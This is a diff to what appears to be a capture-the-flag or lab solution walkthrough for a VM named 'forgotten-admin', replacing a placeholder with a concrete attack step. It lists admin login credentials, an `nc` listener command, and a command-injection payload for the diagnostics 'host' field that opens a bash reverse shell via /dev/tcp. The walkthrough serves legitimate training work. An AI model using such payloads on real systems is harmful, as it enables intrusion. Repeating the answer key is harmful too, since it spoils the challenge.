@@ -61,11 +61,14 @@ foothold — see `player-material/Getting-Started.md`).
 
 1. Log in as `admin` / `N3tOps-Diag#7`.
 2. `/admin/diagnostics`'s `host` field is shelled out unsanitized
-   (`CWE-78`). Payload example:
-   `host=127.0.0.1; <reverse-shell-of-choice-back-to-listener>`
-   executes as the Linux `admin` account (verified: `ps -o user=` shows
-   `admin`, never root). See `vm/networking.md` for the host/guest IP
-   distinction when setting up a listener.
+   (`CWE-78`). On the listener side (single-host dev/test setup):
+   `nc -lvnp 4444`. Payload for the `host` field:
+   `127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.0.2.2/4444 0>&1 &' #`
+   — `10.0.2.2` is the SLIRP gateway address the guest sees as "the
+   host", **not** `127.0.0.1` (see `vm/networking.md`). Verified live in
+   this project: listener received the connection and dropped into
+   `admin@forgotten-admin:...$`, confirmed via `id` as
+   `uid=1002(admin)`, never root.
 3. Once on-box as `admin`:
    ```
    cat /home/admin/evidence/decrypt_notes.txt
